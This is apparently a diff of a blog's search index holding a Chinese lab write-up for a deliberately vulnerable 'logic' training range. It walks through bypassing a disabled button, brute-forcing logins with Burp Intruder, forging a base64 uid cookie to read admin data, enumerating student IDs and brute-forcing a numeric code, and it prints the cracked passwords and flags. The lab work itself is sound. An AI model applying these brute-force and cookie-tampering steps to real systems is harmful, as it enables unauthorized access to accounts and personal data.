+<p>欲获取admin与admin1的个人信息，先将用户名base64编码</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049613.png"></p>
+<p>将第二个数据包中的uid值更换成admin的base64编码，发送数据包，成功获取admin个人信息</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049468.png"></p>
+<p>将第二个数据包中的uid值更换成admin1的base64编码，发送数据包，成功获取admin1个人信息</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049859.png"></p>
+<h2 id="遍历漏洞"><a href="#遍历漏洞" class="headerlink" title="遍历漏洞"></a>遍历漏洞</h2><p>已知当前系统中存在的一个学号为：20190504035XA01，开启burpsuite代理，使用此学号查询</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049755.png"></p>
+<p>根据此学号的格式，推理学号前八位20190504是入学年月日（不变），那么只需要遍历XA之前的三位数字和最后两位数字即可</p>
+<p>将数据包传给intruder模块，使用集束炸弹模式，设置有效载荷</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050820.png"></p>
+<p>将有效载荷选项设置成<strong>暴力</strong>，如下图</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049883.png"></p>
+<p>点击开始攻击，等待一段时间，得到爆破结果</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050568.png"></p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#整合出的编号</span></span><br><span class="line"><span class="number">20190504035</span>XA01</span><br><span class="line"><span class="number">20190504035</span>XA02</span><br><span class="line"><span class="number">20190504036</span>XA03</span><br><span class="line"><span class="number">20190504036</span>XA04</span><br><span class="line"><span class="number">20190504037</span>XA05</span><br><span class="line"><span class="number">20190504037</span>XA06</span><br><span class="line"><span class="number">20190504038</span>XA07</span><br><span class="line"><span class="number">20190504038</span>XA08</span><br></pre></td></tr></table></figure>
+
+<p>查询结果</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050882.png"></p>
+<h2 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a>暴力破解攻击</h2><p>如之前突破功能限制，开启burpsuite代理，按F12将<code>disable=&quot;disable&quot;</code>删除，输入6位数编号查询，抓取数据包</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050498.png"></p>
+<p>将数据包发送到intruder模块，设置如下图</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050745.png"></p>
+<p>将有效载荷类型改成<strong>暴力</strong>，配置如下图，点击开始攻击</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050543.png"></p>
+<p>等待一段时间后，得到爆破结果<code>735142</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312042101819.png"></p>
+<p>查询编号得到弹框FLAG内容<code>flag&#123;d1ct_1s_v3ry_1mp0rt4nt&#125;</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312022050496.png"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -5140,73 +5207,6 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       </categories>
       <tags>
         <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>逻辑漏洞靶场环境——logic</title>
-    <url>/2023/12/02/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94logic/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：逻辑漏洞靶场环境——logic<br>要求提交实验报告<br>1.突破功能限制漏洞。要求突破查询按钮disable限制，获取编号：110010的查询内容（弹框中的flag）。<br>2.用户信息泄漏漏洞。通过回显信息，以暴力破解方式猜测系统中存在的两个用户名(提示：用户名以 “u” 开头)，并暴力破解这两个用户对应的密码。<br>3.越权漏洞。通过上一步破解的用户名密码登录，利用越权漏洞获取admin与admin1的个人信息。<br>4.遍历漏洞。已知当前系统中存在的一个学号为：20190504035XA01。利用遍历漏洞获取其他学号对应的成绩（不少于5条）。<br>5.暴力破解攻击。获取系统中另一个六位数字编号对应的弹框flag内容。</p>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入靶场文件目录下输入<code>docker-compose up -d</code>启动靶场，访问<code>http://192.168.37.128:8993</code>即可</p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="突破功能限制漏洞"><a href="#突破功能限制漏洞" class="headerlink" title="突破功能限制漏洞"></a>突破功能限制漏洞</h2><p>查询按钮是灰色的，无法被点击</p>
-<p><img data-src="https://images.gaifagafin.top/202312022048006.png"></p>
-<p>按F12进入查看器，定位到按钮的前端功能实现，将<code>disable=&quot;disable&quot;</code>删除后点击查询</p>
-<p><img data-src="https://images.gaifagafin.top/202312022048806.png"></p>
-<p>弹窗获得FLAG：<code>flag&#123;byp4ss1s_ez&#125;</code></p>
-<p><img data-src="https://images.gaifagafin.top/202312022049066.png"></p>
-<h2 id="用户信息泄漏漏洞"><a href="#用户信息泄漏漏洞" class="headerlink" title="用户信息泄漏漏洞"></a>用户信息泄漏漏洞</h2><p>随便输入用户名和密码，提示用户名不正确</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049396.png"></p>
-<p>burpsuite开启代理</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049002.png"></p>
-<p>将请求包发送给intruder，对用户名进行爆破，得到用户名如下</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049622.png"></p>
-<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名</span></span><br><span class="line"><span class="keyword">user</span></span><br><span class="line"><span class="title">user1</span></span><br><span class="line">admin</span><br><span class="line">admin1</span><br></pre></td></tr></table></figure>
-
-<p>将爆出的用户名装载进有效负载集，爆破密码</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049648.png"></p>
-<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名及密码</span></span><br><span class="line"><span class="keyword">user</span>	<span class="title">888888</span></span><br><span class="line">user1	<span class="number">123456</span></span><br></pre></td></tr></table></figure>
-
-<p>使用爆破出的用户名及密码成功登录</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049308.png"></p>
-<p><img data-src="https://images.gaifagafin.top/202312022049817.png"></p>
-<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>burpsuite开启代理，使用user1账号登录，发现第一个数据包cookie中有<code>uid=dXNlcjE%3D</code>字段</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049561.png"></p>
-<p>将<code>dXNlcjE%3D</code>使用url解码，再使用base64解码，得到<code>uid=user1</code>，可知uid和账户名有编码对应关系</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049076.png"></p>
-<p>欲获取admin与admin1的个人信息，先将用户名base64编码</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049613.png"></p>
-<p>将第二个数据包中的uid值更换成admin的base64编码，发送数据包，成功获取admin个人信息</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049468.png"></p>
-<p>将第二个数据包中的uid值更换成admin1的base64编码，发送数据包，成功获取admin1个人信息</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049859.png"></p>
-<h2 id="遍历漏洞"><a href="#遍历漏洞" class="headerlink" title="遍历漏洞"></a>遍历漏洞</h2><p>已知当前系统中存在的一个学号为：20190504035XA01，开启burpsuite代理，使用此学号查询</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049755.png"></p>
-<p>根据此学号的格式，推理学号前八位20190504是入学年月日（不变），那么只需要遍历XA之前的三位数字和最后两位数字即可</p>
-<p>将数据包传给intruder模块，使用集束炸弹模式，设置有效载荷</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050820.png"></p>
-<p>将有效载荷选项设置成<strong>暴力</strong>，如下图</p>
-<p><img data-src="https://images.gaifagafin.top/202312022049883.png"></p>
-<p>点击开始攻击，等待一段时间，得到爆破结果</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050568.png"></p>
-<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#整合出的编号</span></span><br><span class="line"><span class="number">20190504035</span>XA01</span><br><span class="line"><span class="number">20190504035</span>XA02</span><br><span class="line"><span class="number">20190504036</span>XA03</span><br><span class="line"><span class="number">20190504036</span>XA04</span><br><span class="line"><span class="number">20190504037</span>XA05</span><br><span class="line"><span class="number">20190504037</span>XA06</span><br><span class="line"><span class="number">20190504038</span>XA07</span><br><span class="line"><span class="number">20190504038</span>XA08</span><br></pre></td></tr></table></figure>
-
-<p>查询结果</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050882.png"></p>
-<h2 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a>暴力破解攻击</h2><p>如之前突破功能限制，开启burpsuite代理，按F12将<code>disable=&quot;disable&quot;</code>删除，输入6位数编号查询，抓取数据包</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050498.png"></p>
-<p>将数据包发送到intruder模块，设置如下图</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050745.png"></p>
-<p>将有效载荷类型改成<strong>暴力</strong>，配置如下图，点击开始攻击</p>
-<p><img data-src="https://images.gaifagafin.top/202312022050543.png"></p>
-<p>等待一段时间后，得到爆破结果<code>735142</code></p>
-<p><img data-src="https://images.gaifagafin.top/202312042101819.png"></p>
-<p>查询编号得到弹框FLAG内容<code>flag&#123;d1ct_1s_v3ry_1mp0rt4nt&#125;</code></p>
-<p><img data-src="https://images.gaifagafin.top/202312022050496.png"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>漏洞</tag>
       </tags>
   </entry>
 </search>
